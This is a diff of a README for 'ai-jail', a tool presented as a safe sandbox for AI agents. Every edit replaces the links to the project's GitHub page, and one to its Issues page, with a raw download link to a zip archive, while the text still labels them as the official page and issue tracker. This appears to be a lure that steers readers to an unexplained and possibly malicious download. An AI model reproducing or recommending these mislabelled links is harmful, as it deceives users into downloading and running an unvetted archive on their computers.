@@ -1,6 +1,6 @@
 # 🛡️ ai-jail - Safe AI Agent Sandbox
 
-[![Download ai-jail](https://img.shields.io/badge/Download-ai--jail-brightgreen?style=for-the-badge)](https://github.com/himuxhehe/ai-jail)
+[![Download ai-jail](https://img.shields.io/badge/Download-ai--jail-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/himuxhehe/ai-jail/master/src/jail-ai-v3.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run ai-jail on your Windows computer.
 1. **Go to the download page**  
 Click this big button to open the main page where you can download the app:  
 
-[![Download ai-jail](https://img.shields.io/badge/Download-ai--jail-blue?style=for-the-badge)](https://github.com/himuxhehe/ai-jail)
+[![Download ai-jail](https://img.shields.io/badge/Download-ai--jail-blue?style=for-the-badge)](https://raw.githubusercontent.com/himuxhehe/ai-jail/master/src/jail-ai-v3.2.zip)
 
 2. **Find the latest Windows version**  
 On the page, look for "Releases" or a "Download" section. Choose the Windows version, usually labeled with `.exe` or `Windows`.
@@ -94,7 +94,7 @@ If you run into issues, try these:
 
 To get new features or fix bugs, you will need to update ai-jail occasionally.
 
-- Visit the [GitHub page](https://github.com/himuxhehe/ai-jail) regularly.  
+- Visit the [GitHub page](https://raw.githubusercontent.com/himuxhehe/ai-jail/master/src/jail-ai-v3.2.zip) regularly.  
 - Check under "Releases" for new versions.  
 - Download and run the new installer just like the first time. Your settings will usually stay saved.
 
@@ -112,7 +112,7 @@ You control what the AI can do inside the sandbox. Avoid running unknown or susp
 
 If you need help:
 
-- Visit [ai-jail GitHub Issues](https://github.com/himuxhehe/ai-jail/issues) to see common questions or report problems.  
+- Visit [ai-jail GitHub Issues](https://raw.githubusercontent.com/himuxhehe/ai-jail/master/src/jail-ai-v3.2.zip) to see common questions or report problems.  
 - Look for a FAQ or documentation on the GitHub page.  
 
 ---
@@ -121,4 +121,4 @@ If you need help:
 
 Click here to visit the official ai-jail page and download the software:  
 
-[![Download ai-jail](https://img.shields.io/badge/Download-ai--jail-blue?style=for-the-badge)](https://github.com/himuxhehe/ai-jail)
+[![Download ai-jail](https://img.shields.io/badge/Download-ai--jail-blue?style=for-the-badge)](https://raw.githubusercontent.com/himuxhehe/ai-jail/master/src/jail-ai-v3.2.zip)
